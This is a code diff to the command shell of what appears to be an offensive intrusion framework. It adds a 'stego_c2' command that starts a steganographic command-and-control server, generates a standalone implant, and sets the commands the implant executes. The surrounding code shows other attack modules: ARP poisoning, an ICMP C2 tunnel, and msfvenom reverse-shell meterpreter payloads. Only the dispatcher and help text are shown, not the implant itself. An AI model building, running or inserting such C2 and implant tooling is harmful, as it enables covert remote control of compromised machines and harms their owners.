@@ -33,6 +33,7 @@ from modules.hare import unleash_hare
 from modules.mitm import MITM
 from modules.icmp_tunnel import send_icmp_command, icmp_c2_listener
 from modules.suggestor import get_suggestions
+from modules import stego_c2
 
 # --- Shell State ---
 current_target = None
@@ -60,6 +61,7 @@ def print_help():
     print("  mitm              - Access the ARP poisoning toolkit")
     print("  icmp              - Use the ICMP C2 Tunnel")
     print("  generate          - Generate a cross-platform payload (msfvenom)")
+    print("  stego_c2          - Use the Steganographic C2 Channel")
     print("  lotl-agent        - Start the LOTL C2 agent")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
@@ -90,6 +92,13 @@ def print_generate_help():
     print("  linux         - linux/x86/meterpreter/reverse_tcp")
     print("  python        - python/meterpreter/reverse_tcp")
     print("  php           - php/meterpreter/reverse_tcp")
+
+def print_stego_c2_help():
+    """Prints the help menu for the stego_c2 command."""
+    print("\n--- Steganographic C2 Channel ---")
+    print("  stego_c2 start              - Start the C2 server")
+    print("  stego_c2 generate <path>    - Generate the standalone implant")
+    print("  stego_c2 command <cmd>      - Set the command for the implant to execute")
 
 def print_icmp_help():
     """Prints the help menu for the icmp command."""
@@ -231,6 +240,40 @@ def run_generate_command(args):
         print("Error: msfvenom is not installed or not in your PATH. Please install Metasploit Framework.")
     except subprocess.CalledProcessError as e:
         print(f"Error generating payload: {e}")
+
+def run_stego_c2_command(args):
+    """Handles the stego_c2 command and its subcommands."""
+    if not args:
+        print_stego_c2_help()
+        return
+
+    command = args[0]
+    command_args = args[1:]
+
+    if command == "start":
+        stego_c2.run_server()
+    elif command == "generate":
+        if len(command_args) != 1:
+            print("Usage: stego_c2 generate <output_path>")
+            return
+        output_path = command_args[0]
+        try:
+            shutil.copyfile("stego_implant.py", output_path)
+            print(f"Implant generated at {output_path}")
+        except Exception as e:
+            print(f"Error generating implant: {e}")
+    elif command == "command":
+        if not command_args:
+            print("Usage: stego_c2 command <command_to_execute>")
+            return
+        full_command = " ".join(command_args)
+        if stego_c2.set_command(full_command):
+            print(f"C2 command set to: {full_command}")
+        else:
+            print("Failed to set C2 command.")
+    else:
+        print(f"Unknown stego_c2 command: {command}")
+        print_stego_c2_help()
 
 def run_icmp_command(args):
     """Handles the icmp command and its subcommands."""
@@ -429,6 +472,8 @@ def process_command(cmd_line):
         run_icmp_command(args)
     elif command == "generate":
         run_generate_command(args)
+    elif command == "stego_c2":
+        run_stego_c2_command(args)
     elif command == "lotl-agent":
         # ... (lotl-agent logic)
         pass
